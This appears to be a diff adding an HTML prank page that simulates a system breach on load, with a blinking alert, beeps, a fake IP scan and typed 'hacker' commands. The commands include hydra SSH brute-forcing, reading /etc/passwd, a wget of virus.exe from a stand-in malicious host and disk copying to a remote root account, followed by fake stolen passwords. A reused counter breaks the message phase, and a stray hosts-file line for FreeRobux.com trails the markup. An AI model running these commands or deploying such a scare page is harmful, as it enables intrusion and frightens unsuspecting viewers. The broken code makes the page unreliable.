@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>System Breach</title>
+  <style>
+    body {
+      background: black;
+      color: #00ff00;
+      font-family: 'Courier New', monospace;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+    #terminal {
+      padding: 20px;
+      white-space: pre-wrap;
+      word-break: break-word;
+      height: 80vh; /* Terminal window size */
+      overflow-y: auto; /* Enable vertical scrolling */
+    }
+    #alert {
+      position: fixed;
+      top: 10px;
+      left: 10px;
+      background-color: red;
+      color: white;
+      padding: 10px 20px;
+      font-weight: bold;
+      box-shadow: 0 0 10px red;
+      animation: blink 0.5s infinite;
+      z-index: 9999;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0; }
+    }
+    .glitch {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: repeating-linear-gradient(
+        0deg,
+        rgba(0, 255, 0, 0.05),
+        rgba(0, 255, 0, 0.05) 2px,
+        black 2px,
+        black 4px
+      );
+      animation: glitch 0.3s infinite;
+      z-index: -1;
+    }
+    @keyframes glitch {
+      0% { transform: translate(0, 0); }
+      25% { transform: translate(-2px, 2px); }
+      50% { transform: translate(2px, -2px); }
+      75% { transform: translate(-1px, 1px); }
+      100% { transform: translate(0, 0); }
+    }
+  </style>
+</head>
+<body>
+  <div id="alert">⚠ SYSTEM BREACH DETECTED ⚠</div>
+  <div class="glitch"></div>
+  <div id="terminal"></div>
+  <audio id="alertSound" src="https://www.soundjay.com/button/beep-07.wav"></audio>
+
+  <script>
+    const terminal = document.getElementById("terminal");
+    const sound = document.getElementById("alertSound");
+
+    // Function to simulate random IP address
+    function getRandomIP() {
+      return `${rand(1, 255)}.${rand(0, 255)}.${rand(0, 255)}.${rand(1, 254)}`;
+    }
+
+    // Random number generator function
+    function rand(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
+
+    // Arrays of fake commands and messages
+    const hackerCommands = [
+      "ping 192.168.1.1 -t",
+      "traceroute 10.0.0.3",
+      "nmap -sP 192.168.0.0/24",
+      "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100",
+      "dir /s /b C:\\Program Files\\",
+      "cat /etc/passwd",
+      "wget http://malicioussite.com/virus.exe",
+      "ssh root@192.168.1.10",
+      "scp /dev/sda1 root@192.168.0.2:/backup",
+      "sudo apt-get install backdoor-tool",
+      "chmod 777 /etc/passwd"
+    ];
+
+    // List of websites with fake user/password data
+    const websitePasswords = [
+      { website: "facebook.com", username: "user123", password: "pass@123" },
+      { website: "twitter.com", username: "john_doe", password: "secure1234" },
+      { website: "instagram.com", username: "insta_user", password: "imfamous2024" },
+      { website: "netflix.com", username: "movie_buff", password: "netflix123" },
+      { website: "amazon.com", username: "prime_user", password: "shopnow42" },
+      { website: "gmail.com", username: "test_email", password: "email123!" }
+    ];
+
+    const finalMessages = [
+      "[INFO] Initiating security bypass...",
+      "[INFO] Unauthorized access detected!",
+      "[ALERT] Accessing root-level privileges...",
+      "[ERROR] Antivirus disabled.",
+      "[INFO] Exploit found: CVE-2019-1234",
+      "[INFO] Uploading exploit to remote server...",
+      "[WARNING] Ransomware encryption initiated!",
+      "[INFO] Database dump successful.",
+      "[ALERT] SYSTEM OVERRIDE IN PROGRESS",
+      "[INFO] System Override Complete.",
+      "[INFO] Reading passwords..."
+    ];
+
+    let i = 0;
+    let commandIndex = 0;
+    let scanningIPs = true;
+
+    // Function to simulate typing commands and system messages
+    function typeLine(text) {
+      terminal.innerHTML += text + "\n";
+      terminal.scrollTop = terminal.scrollHeight; // Auto-scroll to bottom
+      sound.play();
+    }
+
+    // Function to simulate IP scan sequence
+    function showIPScan() {
+      if (i < 100) {
+        const ip = getRandomIP();
+        typeLine(`[SCAN] Attempting access to ${ip}`);
+        i++;
+        setTimeout(showIPScan, 80); // Adjust to speed up/slow down the scanning
+      } else {
+        setTimeout(showNextCommand, 1000); // Continue after scanning
+      }
+    }
+
+    // Function to simulate typing hacker commands
+    function showNextCommand() {
+      if (commandIndex < hackerCommands.length) {
+        typeLine(`$ ${hackerCommands[commandIndex]}`);
+        commandIndex++;
+        setTimeout(showNextCommand, 1200); // Adjust to control typing speed
+      } else {
+        setTimeout(showNextPhase, 1000); // Continue with system breach messages
+      }
+    }
+
+    // Function to show the system breach process (fake logs)
+    function showNextPhase() {
+      if (i < finalMessages.length) {
+        typeLine(finalMessages[i]);
+        i++;
+        setTimeout(showNextPhase, 1500); // Adjust to control message speed
+      } else {
+        setTimeout(showPasswords, 1000); // Once messages are done, show passwords
+      }
+    }
+
+    // Function to show fake passwords and websites
+    function showPasswords() {
+      websitePasswords.forEach((entry, index) => {
+        setTimeout(() => {
+          typeLine(`[WEBSITE] ${entry.website}`);
+          typeLine(`[USER] ${entry.username}`);
+          typeLine(`[PASS] ${entry.password}\n`);
+        }, index * 1500); // Delay for each entry for dramatic effect
+      });
+    }
+
+    // Start the process
+    window.onload = () => {
+      sound.play();
+      showIPScan(); // Start the IP scan phase
+    };
+  </script>
+</body>
+</html>
+127.0.0.1    FreeRobux.com
